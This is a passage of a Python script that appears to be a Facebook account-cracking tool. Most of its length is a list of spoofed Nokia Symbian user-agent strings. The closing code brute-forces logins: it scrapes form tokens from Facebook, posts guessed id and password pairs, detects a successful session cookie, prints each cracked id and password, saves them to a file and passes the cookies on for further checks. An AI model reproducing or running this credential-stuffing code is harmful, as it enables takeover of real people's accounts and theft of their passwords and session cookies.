Nokia4907/110.021.0028; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/535.1 (KHTML, like Gecko) NokiaBrowser/3.3.3.1 Mobile Safari/535.1', 'Mozilla/5.0 (Symbian/3; Series60/2.2 Nokia849/110.021.0028; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/535.1 (KHTML, like Gecko) NokiaBrowser/5.1.3.3 Mobile Safari/535.1', 'Mozilla/5.0 (Symbian/3; Series60/6.5 Nokia6050/110.021.0028; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/535.1 (KHTML, like Gecko) NokiaBrowser/7.2.2.3 Mobile Safari/535.1', 'Mozilla/5.0 (Symbian/3; Series60/7.5 Nokia8464/110.021.0028; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/535.1 (KHTML, like Gecko) NokiaBrowser/6.2.3.3 Mobile Safari/535.1', 'Mozilla/5.0 (Symbian/3; Series60/4.8 Nokia9560/110.021.0028; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/535.1 (KHTML, like Gecko) NokiaBrowser/5.1.2.3 Mobile Safari/535.1', 'Mozilla/5.0 (Symbian/3; Series60/1.6 Nokia8662/110.021.0028; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/535.1 (KHTML, like Gecko) NokiaBrowser/1.3.2.2 Mobile Safari/535.1', 'Mozilla/5.0 (Symbian/3; Series60/7.5 Nokia7597/110.021.0028; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/535.1 (KHTML, like Gecko) NokiaBrowser/8.3.2.1 Mobile Safari/535.1', 'Mozilla/5.0 (Symbian/3; Series60/7.8 Nokia8673/110.021.0028; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/535.1 (KHTML, like Gecko) NokiaBrowser/1.1.3.1 Mobile Safari/535.1', 'Mozilla/5.0 (Symbian/3; Series60/5.6 Nokia2524/110.021.0028; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/535.1 (KHTML, like Gecko) NokiaBrowser/7.3.3.2 Mobile Safari/535.1', 'Mozilla/5.0 (Symbian/3; Series60/5.1 Nokia6929/110.021.0028; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/535.1 (KHTML, like Gecko) NokiaBrowser/3.3.2.2 Mobile Safari/535.1', 'Mozilla/5.0 (Symbian/3; Series60/7.2 Nokia5427/110.021.0028; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/535.1 (KHTML, like Gecko) NokiaBrowser/5.1.3.2 Mobile Safari/535.1', 'Mozilla/5.0 (Symbian/3; Series60/7.3 Nokia1343/110.021.0028; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/535.1 (KHTML, like Gecko) NokiaBrowser/7.3.1.3 Mobile Safari/535.1', 'Mozilla/5.0 (Symbian/3; Series60/2.8 Nokia1206/110.021.0028; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/535.1 (KHTML, like Gecko) NokiaBrowser/6.2.1.2 Mobile Safari/535.1', 'Mozilla/5.0 (Symbian/3; Series60/1.8 Nokia4903/110.021.0028; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/535.1 (KHTML, like Gecko) NokiaBrowser/8.1.3.3 Mobile Safari/535.1', 'Mozilla/5.0 (Symbian/3; Series60/4.4 Nokia5818/110.021.0028; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/535.1 (KHTML, like Gecko) NokiaBrowser/6.2.1.3 Mobile Safari/535.1', 'Mozilla/5.0 (Symbian/3; Series60/5.5 Nokia8362/110.021.0028; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/535.1 (KHTML, like Gecko) NokiaBrowser/4.1.3.2 Mobile Safari/535.1', 'Mozilla/5.0 (Symbian/3; Series60/1.1 Nokia7843/110.021.0028; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/535.1 (KHTML, like Gecko) NokiaBrowser/6.3.2.1 Mobile Safari/535.1', 'Mozilla/5.0 (Symbian/3; Series60/4.2 Nokia4047/110.021.0028; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/535.1 (KHTML, like Gecko) NokiaBrowser/2.3.2.3 Mobile Safari/535.1', 'Mozilla/5.0 (Symbian/3; Series60/3.8 Nokia4704/110.021.0028; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/535.1 (KHTML, like Gecko) NokiaBrowser/6.1.3.3 Mobile Safari/535.1', 'Mozilla/5.0 (Symbian/3; Series60/3.8 Nokia8340/110.021.0028; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/535.1 (KHTML, like Gecko) NokiaBrowser/5.3.1.1 Mobile Safari/535.1', 'Mozilla/5.0 (Symbian/3; Series60/4.4 Nokia5176/110.021.0028; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/535.1 (KHTML, like Gecko) NokiaBrowser/4.2.2.1 Mobile Safari/535.1', 'Mozilla/5.0 (Symbian/3; Series60/7.5 Nokia3839/110.021.0028; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/535.1 (KHTML, like Gecko) NokiaBrowser/7.3.3.3 Mobile Safari/535.1', 'Mozilla/5.0 (Symbian/3; Series60/8.7 Nokia6787/110.021.0028; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/535.1 (KHTML, like Gecko) NokiaBrowser/1.1.2.2 Mobile Safari/535.1', 'Mozilla/5.0 (Symbian/3; Series60/5.7 Nokia6334/110.021.0028; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/535.1 (KHTML, like Gecko) NokiaBrowser/7.1.1.1 Mobile Safari/535.1', 'Mozilla/5.0 (Symbian/3; Series60/5.5 Nokia943/110.021.0028; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/535.1 (KHTML, like Gecko) NokiaBrowser/7.1.1.2 Mobile Safari/535.1', 'Mozilla/5.0 (Symbian/3; Series60/5.3 Nokia6578/110.021.0028; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/535.1 (KHTML, like Gecko) NokiaBrowser/5.3.2.2 Mobile Safari/535.1', 'Mozilla/5.0 (Symbian/3; Series60/7.6 Nokia3939/110.021.0028; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/535.1 (KHTML, like Gecko) NokiaBrowser/2.1.2.3 Mobile Safari/535.1', 'Mozilla/5.0 (Symbian/3; Series60/5.8 Nokia669/110.021.0028; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/535.1 (KHTML, like Gecko) NokiaBrowser/7.1.2.1 Mobile Safari/535.1', 'Mozilla/5.0 (Symbian/3; Series60/6.1 Nokia5784/110.021.0028; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/535.1 (KHTML, like Gecko) NokiaBrowser/7.3.3.2 Mobile Safari/535.1', 'Mozilla/5.0 (Symbian/3; Series60/4.8 Nokia2415/110.021.0028; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/535.1 (KHTML, like Gecko) NokiaBrowser/3.1.3.2 Mobile Safari/535.1', 'Mozilla/5.0 (Symbian/3; Series60/6.6 Nokia1525/110.021.0028; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/535.1 (KHTML, like Gecko) NokiaBrowser/3.2.1.2 Mobile Safari/535.1', 'Mozilla/5.0 (Symbian/3; Series60/6.6 Nokia5923/110.021.0028; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/535.1 (KHTML, like Gecko) NokiaBrowser/2.3.2.2 Mobile Safari/535.1', 'Mozilla/5.0 (Symbian/3; Series60/4.7 Nokia6059/110.021.0028; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/535.1 (KHTML, like Gecko) NokiaBrowser/4.3.1.2 Mobile Safari/535.1', 'Mozilla/5.0 (Symbian/3; Series60/4.6 Nokia5880/110.021.0028; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/535.1 (KHTML, like Gecko) NokiaBrowser/2.1.1.3 Mobile Safari/535.1', 'Mozilla/5.0 (Symbian/3; Series60/3.5 Nokia6215/110.021.0028; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/535.1 (KHTML, like Gecko) NokiaBrowser/6.1.2.1 Mobile Safari/535.1', 'Mozilla/5.0 (Symbian/3; Series60/1.2 Nokia8069/110.021.0028; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/535.1 (KHTML, like Gecko) NokiaBrowser/6.1.3.1 Mobile Safari/535.1', 'Mozilla/5.0 (Symbian/3; Series60/1.5 Nokia2634/110.021.0028; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/535.1 (KHTML, like Gecko) NokiaBrowser/5.2.1.3 Mobile Safari/535.1', 'Mozilla/5.0 (Symbian/3; Series60/4.1 Nokia1646/110.021.0028; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/535.1 (KHTML, like Gecko) NokiaBrowser/5.2.1.2 Mobile Safari/535.1', 'Mozilla/5.0 (Symbian/3; Series60/8.2 Nokia2701/110.021.0028; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/535.1 (KHTML, like Gecko) NokiaBrowser/5.2.2.1 Mobile Safari/535.1', 'Mozilla/5.0 (Symbian/3; Series60/1.6 Nokia6692/110.021.0028; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/535.1 (KHTML, like Gecko) NokiaBrowser/1.1.1.3 Mobile Safari/535.1', 'Mozilla/5.0 (Symbian/3; Series60/6.3 Nokia9455/110.021.0028; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/535.1 (KHTML, like Gecko) NokiaBrowser/4.1.3.1 Mobile Safari/535.1', 'Mozilla/5.0 (Symbian/3; Series60/4.1 Nokia3036/110.021.0028; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/535.1 (KHTML, like Gecko) NokiaBrowser/8.1.2.1 Mobile Safari/535.1', 'Mozilla/5.0 (Symbian/3; Series60/3.3 Nokia5315/110.021.0028; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/535.1 (KHTML, like Gecko) NokiaBrowser/4.2.1.2 Mobile Safari/535.1', 'Mozilla/5.0 (Symbian/3; Series60/5.8 Nokia6475/110.021.0028; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/535.1 (KHTML, like Gecko) NokiaBrowser/1.3.1.3 Mobile Safari/535.1', 'Mozilla/5.0 (Symbian/3; Series60/1.7 Nokia991/110.021.0028; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/535.1 (KHTML, like Gecko) NokiaBrowser/6.2.2.1 Mobile Safari/535.1', 'Mozilla/5.0 (Symbian/3; Series60/4.4 Nokia8886/110.021.0028; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/535.1 (KHTML, like Gecko) NokiaBrowser/8.1.2.3 Mobile Safari/535.1', 'Mozilla/5.0 (Symbian/3; Series60/7.3 Nokia3689/110.021.0028; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/535.1 (KHTML, like Gecko) NokiaBrowser/6.1.2.1 Mobile Safari/535.1', 'Mozilla/5.0 (Symbian/3; Series60/4.7 Nokia8051/110.021.0028; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/535.1 (KHTML, like Gecko) NokiaBrowser/6.1.1.2 Mobile Safari/535.1', 'Mozilla/5.0 (Symbian/3; Series60/2.3 Nokia519/110.021.0028; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/535.1 (KHTML, like Gecko) NokiaBrowser/5.3.1.1 Mobile Safari/535.1', 'Mozilla/5.0 (Symbian/3; Series60/1.5 Nokia1826/110.021.0028; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/535.1 (KHTML, like Gecko) NokiaBrowser/8.2.2.2 Mobile Safari/535.1', 'Mozilla/5.0 (Symbian/3; Series60/8.1 Nokia4221/110.021.0028; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/535.1 (KHTML, like Gecko) NokiaBrowser/7.1.2.2 Mobile Safari/535.1', 'Mozilla/5.0 (Symbian/3; Series60/4.7 Nokia5141/110.021.0028; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/535.1 (KHTML, like Gecko) NokiaBrowser/4.1.1.3 Mobile Safari/535.1', 'Mozilla/5.0 (Symbian/3; Series60/6.5 Nokia3665/110.021.0028; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/535.1 (KHTML, like Gecko) NokiaBrowser/7.1.1.2 Mobile Safari/535.1', 'Mozilla/5.0 (Symbian/3; Series60/2.6 Nokia2265/110.021.0028; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/535.1 (KHTML, like Gecko) NokiaBrowser/1.2.3.3 Mobile Safari/535.1', 'Mozilla/5.0 (Symbian/3; Series60/2.4 Nokia7048/110.021.0028; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/535.1 (KHTML, like Gecko) NokiaBrowser/3.3.2.2 Mobile Safari/535.1', 'Mozilla/5.0 (Symbian/3; Series60/5.2 Nokia8212/110.021.0028; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/535.1 (KHTML, like Gecko) NokiaBrowser/8.2.1.1 Mobile Safari/535.1', 'Mozilla/5.0 (Symbian/3; Series60/1.7 Nokia2471/110.021.0028; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/535.1 (KHTML, like Gecko) NokiaBrowser/7.3.3.1 Mobile Safari/535.1', 'Mozilla/5.0 (Symbian/3; Series60/7.6 Nokia8854/110.021.0028; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/535.1 (KHTML, like Gecko) NokiaBrowser/4.1.1.1 Mobile Safari/535.1', 'Mozilla/5.0 (Symbian/3; Series60/1.5 Nokia8213/110.021.0028; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/535.1 (KHTML, like Gecko) NokiaBrowser/4.1.2.3 Mobile Safari/535.1', 'Mozilla/5.0 (Symbian/3; Series60/5.8 Nokia9608/110.021.0028; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/535.1 (KHTML, like Gecko) NokiaBrowser/6.1.2.2 Mobile Safari/535.1', 'Mozilla/5.0 (Symbian/3; Series60/2.3 Nokia711/110.021.0028; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/535.1 (KHTML, like Gecko) NokiaBrowser/7.1.2.1 Mobile Safari/535.1', 'Mozilla/5.0 (Symbian/3; Series60/2.5 Nokia1344/110.021.0028; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/535.1 (KHTML, like Gecko) NokiaBrowser/6.1.3.3 Mobile Safari/535.1', 'Mozilla/5.0 (Symbian/3; Series60/4.2 Nokia7343/110.021.0028; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/535.1 (KHTML, like Gecko) NokiaBrowser/7.1.2.2 Mobile Safari/535.1', 'Mozilla/5.0 (Symbian/3; Series60/7.7 Nokia9541/110.021.0028; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/535.1 (KHTML, like Gecko) NokiaBrowser/3.2.1.2 Mobile Safari/535.1', 'Mozilla/5.0 (Symbian/3; Series60/5.1 Nokia8587/110.021.0028; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/535.1 (KHTML, like Gecko) NokiaBrowser/1.2.3.1 Mobile Safari/535.1', 'Mozilla/5.0 (Symbian/3; Series60/4.2 Nokia689/110.021.0028; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/535.1 (KHTML, like Gecko) NokiaBrowser/4.2.2.1 Mobile Safari/535.1', 'Mozilla/5.0 (Symbian/3; Series60/2.3 Nokia2616/110.021.0028; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/535.1 (KHTML, like Gecko) NokiaBrowser/6.1.2.1 Mobile Safari/535.1', 'Mozilla/5.0 (Symbian/3; Series60/7.3 Nokia2216/110.021.0028; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/535.1 (KHTML, like Gecko) NokiaBrowser/5.1.2.3 Mobile Safari/535.1', 'Mozilla/5.0 (Symbian/3; Series60/5.4 Nokia9500/110.021.0028; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/535.1 (KHTML, like Gecko) NokiaBrowser/3.1.3.1 Mobile Safari/535.1', 'Mozilla/5.0 (Symbian/3; Series60/7.5 Nokia6731/110.021.0028; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/535.1 (KHTML, like Gecko) NokiaBrowser/5.2.1.1 Mobile Safari/535.1', 'Mozilla/5.0 (Symbian/3; Series60/2.6 Nokia5011/110.021.0028; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/535.1 (KHTML, like Gecko) NokiaBrowser/2.2.3.2 Mobile Safari/535.1', 'Mozilla/5.0 (Symbian/3; Series60/5.5 Nokia583/110.021.0028; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/535.1 (KHTML, like Gecko) NokiaBrowser/1.3.1.2 Mobile Safari/535.1', 'Mozilla/5.0 (Symbian/3; Series60/4.6 Nokia4218/110.021.0028; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/535.1 (KHTML, like Gecko) NokiaBrowser/7.2.3.1 Mobile Safari/535.1', 'Mozilla/5.0 (Symbian/3; Series60/3.7 Nokia8997/110.021.0028; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/535.1 (KHTML, like Gecko) NokiaBrowser/1.2.3.2 Mobile Safari/535.1', 'Mozilla/5.0 (Symbian/3; Series60/1.3 Nokia1767/110.021.0028; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/535.1 (KHTML, like Gecko) NokiaBrowser/6.1.1.1 Mobile Safari/535.1', 'Mozilla/5.0 (Symbian/3; Series60/3.4 Nokia7169/110.021.0028; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/535.1 (KHTML, like Gecko) NokiaBrowser/7.2.1.3 Mobile Safari/535.1', 'Mozilla/5.0 (Symbian/3; Series60/8.8 Nokia7377/110.021.0028; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/535.1 (KHTML, like Gecko) NokiaBrowser/6.2.2.3 Mobile Safari/535.1', 'Mozilla/5.0 (Symbian/3; Series60/5.6 Nokia6466/110.021.0028; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/535.1 (KHTML, like Gecko) NokiaBrowser/6.1.2.1 Mobile Safari/535.1', 'Mozilla/5.0 (Symbian/3; Series60/7.3 Nokia6847/110.021.0028; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/535.1 (KHTML, like Gecko) NokiaBrowser/6.3.3.1 Mobile Safari/535.1', 'Mozilla/5.0 (Symbian/3; Series60/5.4 Nokia493/110.021.0028; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/535.1 (KHTML, like Gecko) NokiaBrowser/1.3.3.1 Mobile Safari/535.1', 'Mozilla/5.0 (Symbian/3; Series60/3.7 Nokia2673/110.021.0028; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/535.1 (KHTML, like Gecko) NokiaBrowser/8.2.2.2 Mobile Safari/535.1', 'Mozilla/5.0 (Symbian/3; Series60/6.6 Nokia209/110.021.0028; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/535.1 (KHTML, like Gecko) NokiaBrowser/2.2.1.3 Mobile Safari/535.1', 'Mozilla/5.0 (Symbian/3; Series60/1.2 Nokia3961/110.021.0028; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/535.1 (KHTML, like Gecko) NokiaBrowser/8.1.2.3 Mobile Safari/535.1', 'Mozilla/5.0 (Symbian/3; Series60/3.2 Nokia6619/110.021.0028; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/535.1 (KHTML, like Gecko) NokiaBrowser/7.1.2.3 Mobile Safari/535.1', 'Mozilla/5.0 (Symbian/3; Series60/5.3 Nokia422/110.021.0028; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/535.1 (KHTML, like Gecko) NokiaBrowser/7.3.1.2 Mobile Safari/535.1', 'Mozilla/5.0 (Symbian/3; Series60/3.1 Nokia5087/110.021.0028; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/535.1 (KHTML, like Gecko) NokiaBrowser/7.1.2.1 Mobile Safari/535.1', 'Mozilla/5.0 (Symbian/3; Series60/3.8 Nokia3311/110.021.0028; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/535.1 (KHTML, like Gecko) NokiaBrowser/5.2.1.1 Mobile Safari/535.1', 'Mozilla/5.0 (Symbian/3; Series60/1.6 Nokia8198/110.021.0028; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/535.1 (KHTML, like Gecko) NokiaBrowser/7.1.3.1 Mobile Safari/535.1', 'Mozilla/5.0 (Symbian/3; Series60/7.2 Nokia4299/110.021.0028; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/535.1 (KHTML, like Gecko) NokiaBrowser/7.2.1.2 Mobile Safari/535.1', 'Mozilla/5.0 (Symbian/3; Series60/8.3 Nokia4812/110.021.0028; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/535.1 (KHTML, like Gecko) NokiaBrowser/7.2.3.2 Mobile Safari/535.1', 'Mozilla/5.0 (Symbian/3; Series60/5.5 Nokia689/110.021.0028; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/535.1 (KHTML, like Gecko) NokiaBrowser/5.3.3.1 Mobile Safari/535.1', 'Mozilla/5.0 (Symbian/3; Series60/3.2 Nokia2154/110.021.0028; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/535.1 (KHTML, like Gecko) NokiaBrowser/6.1.2.1 Mobile Safari/535.1', 'Mozilla/5.0 (Symbian/3; Series60/6.7 Nokia2035/110.021.0028; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/535.1 (KHTML, like Gecko) NokiaBrowser/2.2.3.2 Mobile Safari/535.1', 'Mozilla/5.0 (Symbian/3; Series60/6.6 Nokia2312/110.021.0028; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/535.1 (KHTML, like Gecko) NokiaBrowser/5.3.1.2 Mobile Safari/535.1', 'Mozilla/5.0 (Symbian/3; Series60/4.3 Nokia2484/110.021.0028; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/535.1 (KHTML, like Gecko) NokiaBrowser/5.2.1.2 Mobile Safari/535.1', 'Mozilla/5.0 (Symbian/3; Series60/5.6 Nokia9026/110.021.0028; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/535.1 (KHTML, like Gecko) NokiaBrowser/7.2.1.2 Mobile Safari/535.1', 'Mozilla/5.0 (Symbian/3; Series60/6.4 Nokia6380/110.021.0028; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/535.1 (KHTML, like Gecko) NokiaBrowser/6.3.1.3 Mobile Safari/535.1', 'Mozilla/5.0 (Symbian/3; Series60/2.4 Nokia5489/110.021.0028; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/535.1 (KHTML, like Gecko) NokiaBrowser/5.3.3.1 Mobile Safari/535.1', 'Mozilla/5.0 (Symbian/3; Series60/8.4 Nokia2325/110.021.0028; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/535.1 (KHTML, like Gecko) NokiaBrowser/1.1.1.1 Mobile Safari/535.1', 'Mozilla/5.0 (Symbian/3; Series60/5.8 Nokia3601/110.021.0028; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/535.1 (KHTML, like Gecko) NokiaBrowser/3.3.2.1 Mobile Safari/535.1', 'Mozilla/5.0 (Symbian/3; Series60/2.2 Nokia6824/110.021.0028; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/535.1 (KHTML, like Gecko) NokiaBrowser/4.3.2.2 Mobile Safari/535.1', 'Mozilla/5.0 (Symbian/3; Series60/4.4 Nokia2621/110.021.0028; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/535.1 (KHTML, like Gecko) NokiaBrowser/8.3.1.1 Mobile Safari/535.1', 'Mozilla/5.0 (Symbian/3; Series60/8.3 Nokia6031/110.021.0028; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/535.1 (KHTML, like Gecko) NokiaBrowser/7.3.3.3 Mobile Safari/535.1', 'Mozilla/5.0 (Symbian/3; Series60/4.7 Nokia3454/110.021.0028; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/535.1 (KHTML, like Gecko) NokiaBrowser/4.1.2.2 Mobile Safari/535.1', 'Mozilla/5.0 (Symbian/3; Series60/6.4 Nokia1904/110.021.0028; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/535.1 (KHTML, like Gecko) NokiaBrowser/2.3.3.3 Mobile Safari/535.1', 'Mozilla/5.0 (Symbian/3; Series60/6.3 Nokia8647/110.021.0028; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/535.1 (KHTML, like Gecko) NokiaBrowser/7.2.2.2 Mobile Safari/535.1', 'Mozilla/5.0 (Symbian/3; Series60/6.5 Nokia7831/110.021.0028; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/535.1 (KHTML, like Gecko) NokiaBrowser/1.2.1.2 Mobile Safari/535.1', 'Mozilla/5.0 (Symbian/3; Series60/6.6 Nokia6171/110.021.0028; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/535.1 (KHTML, like Gecko) NokiaBrowser/3.1.3.3 Mobile Safari/535.1', 'Mozilla/5.0 (Symbian/3; Series60/4.6 Nokia8977/110.021.0028; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/535.1 (KHTML, like Gecko) NokiaBrowser/5.3.2.2 Mobile Safari/535.1']
            session = requests.Session()
            sys.stdout.write('\r [BLACK]-[%s|%s]\33[1;92m[OK:%s]\r'%(loop,tl,len(oks))),
            sys.stdout.flush()
            pro = random.choice(agents)
            m_fb = session.get('https://p.facebook.com/?tbua=1').text
            log_data = {
                "lsd":re.search('name="lsd" value="(.*?)"', str(m_fb)).group(1),
            "jazoest":re.search('name="jazoest" value="(.*?)"', str(m_fb)).group(1),
            "m_ts":re.search('name="m_ts" value="(.*?)"', str(m_fb)).group(1),
            "li":re.search('name="li" value="(.*?)"', str(m_fb)).group(1),
            "try_number":"0",
            "unrecognized_tries":"0",
            "email":uid,
            "pass":ps,
            "login":"Log In"}
            header_freefb = {'authority': 'm.facebook.com',
            'method':'POST',
            'path':'/?tbua=1',
            'scheme':'https',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language': 'en-US,en;q=0.9',
            'cache-control': 'max-age=0',
            'sec-ch-prefers-color-scheme': 'light',
            'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
            'sec-ch-ua-full-version-list': '"Not)A;Brand";v="24.0.0.0", "Chromium";v="116.0.5845.27"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-ch-ua-platform-version': '"12.0.0"',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'none',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
            'user-agent': pro,}
            lo = session.post('https://www.facebook.com/login/device-based/regular/login/?refsrc=deprecated&amp;lwv=100&amp;refid=8',data=log_data,headers=header_freefb).text
            log_cookies=session.cookies.get_dict().keys()
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[65:80]
                print(f'\r\33[1;97m [\33[1;92mBLACK-OK\33[1;97m] \33[1;92m'+cid+' | '+ps+'\33[0;92m')
                open('BLACK-OK.txt', 'a').write(cid+' | '+ps+'\n')
                oks.append(uid);cek_apk(coki)
                break
            else:
                continue
        loop+=1
    except:
        pass
        
Main()
